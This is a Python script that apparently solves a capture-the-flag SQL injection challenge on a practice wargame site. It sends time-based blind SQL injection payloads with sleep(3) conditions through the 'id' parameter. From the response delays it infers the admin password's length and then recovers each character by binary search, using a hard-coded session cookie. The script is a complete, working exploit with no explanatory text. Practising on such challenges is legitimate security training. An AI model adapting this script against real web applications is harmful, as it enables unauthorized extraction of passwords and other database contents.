import requests
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php"
cookie = {"PHPSESSID":"leco90m74ui20oikeo0n338f6b"}

print("🖤 Start SQLi...")

for i in range(1,100):
    payload = f"?id=' || id='admin' and if(length(pw)={i},sleep(3),0) %23"
    pre = time.time()
    requests.get(url+payload, cookies=cookie)
    post = time.time()
    if(post-pre>3):
        length = i
        print(f">> length : {length}")
        break

ans=""

for letter in range(1,length+1):
    print(f"🖤 Checking letter {letter}...")
    start = 32
    end = 127
    while True:
        middle = round((start+end)/2)
        payload = f"?id=' || id='admin' and if(ascii(substr(pw,{letter},1))>={middle},sleep(3),0) %23"
        pre = time.time()
        requests.get(url+payload, cookies=cookie)
        post = time.time()
        if(post-pre>3):
            payload = f"?id=' || id='admin' and if(ascii(substr(pw,{letter},1))={middle},sleep(3),0) %23"
            pre = time.time()
            requests.get(url+payload, cookies=cookie)
            post = time.time()
            if(post-pre>3):
                print(f">> letter {letter} → {chr(middle)}")
                ans+=chr(middle)
                break
            else:
                start = middle
        else:
            end = middle
            continue

print(f"🖤 Answer : {ans}")
        
